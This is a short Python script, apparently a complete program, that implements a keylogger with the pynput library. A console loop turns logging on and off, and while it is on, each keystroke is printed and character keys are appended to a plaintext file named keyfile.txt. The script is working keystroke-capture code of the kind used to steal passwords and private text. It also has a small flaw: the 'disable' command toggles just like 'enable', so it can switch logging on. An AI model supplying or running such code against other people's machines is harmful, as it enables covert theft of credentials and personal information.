from pynput import keyboard

# Create a flag to keep track of whether the keylogger is enabled
enabled = False

def toggleKeylogger():
    """
    Function to toggle the state of the keylogger.
    """
    global enabled
    enabled = not enabled
    if enabled:
        print("Keylogger enabled.")
    else:
        print("Keylogger disabled.")

def keyPressed(key):
    """
    Function called when a key is pressed.
    """
    global enabled
    if enabled:
        # Convert the pressed key to a string and print it
        print(str(key))

        with open("keyfile.txt", 'a') as logKey:
            try:
                # Try to retrieve the character representation of the key
                char = key.char
                logKey.write(char)
            except AttributeError:
                # If the key does not have a character representation, handle the error
                print("Error getting char")

if __name__ == "__main__":
    # Create a listener object with the 'keyPressed' function as the callback for the 'on_press' event
    listener = keyboard.Listener(on_press=keyPressed)

    # Start the listener
    listener.start()

    # Wait for user input to toggle the keylogger
    while True:
        command = input("Enter command (x: enable, c: disable, q: quit): ")
        if command == "x":
            toggleKeylogger()
        elif command == "c":
            toggleKeylogger()
        elif command == "q":
            break
        else:
            print("Invalid command.")
